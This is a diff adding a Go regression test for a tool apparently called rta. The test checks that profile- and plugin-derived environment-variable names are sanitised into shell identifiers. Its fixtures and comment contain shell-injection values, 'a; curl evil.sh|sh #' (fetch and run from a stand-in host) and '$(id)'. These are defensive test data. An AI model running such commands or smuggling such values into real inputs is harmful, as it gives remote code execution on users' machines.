@@ -114,3 +114,38 @@ func TestLocalEnvVarNaming(t *testing.T) {
 		}
 	}
 }
+
+// **A derived variable name is a shell identifier whatever it was derived
+// from.**
+//
+// Both callers' inputs are validated — a plugin's name and inputs by
+// `^[a-z][a-z0-9-]*$` at registration, a profile's by
+// `^[a-z0-9][a-z0-9-]{0,62}$` before it is written — so on anything this is
+// supposed to see the filter is a no-op, and the two cases below prove that
+// first. The third is what actually happened: a profile hand-written into a
+// config file, which the loader marks invalid and the profiles pane prints in
+// red, and out of which rta built `RTA_PROFILE_A; CURL EVIL.SH|SH #_TOKEN` and
+// offered it as a line to paste into a shell.
+func TestADerivedVariableNameIsAlwaysAnIdentifier(t *testing.T) {
+	for _, tc := range []struct{ profile, input, want string }{
+		{"staging", "password", "RTA_PROFILE_STAGING_PASSWORD"},
+		{"proj1-staging", "secret-key", "RTA_PROFILE_PROJ1_STAGING_SECRET_KEY"},
+		{"a; curl evil.sh|sh #", "token", "RTA_PROFILE_A__CURL_EVIL_SH_SH___TOKEN"},
+		{"$(id)", "token", "RTA_PROFILE___ID__TOKEN"},
+	} {
+		if got := ProfileEnvVar(tc.profile, tc.input); got != tc.want {
+			t.Errorf("ProfileEnvVar(%q, %q) = %q, want %q", tc.profile, tc.input, got, tc.want)
+		}
+	}
+	for _, name := range []string{
+		ProfileEnvVar("a; curl evil.sh|sh #", "token"),
+		ProfileEnvVar("$(id)", "token"),
+		LocalEnvVar("pg.query", "password"),
+	} {
+		for _, r := range name {
+			if !((r >= 'A' && r <= 'Z') || (r >= '0' && r <= '9') || r == '_') {
+				t.Errorf("%q holds %q, which a shell will not read as part of a name", name, r)
+			}
+		}
+	}
+}
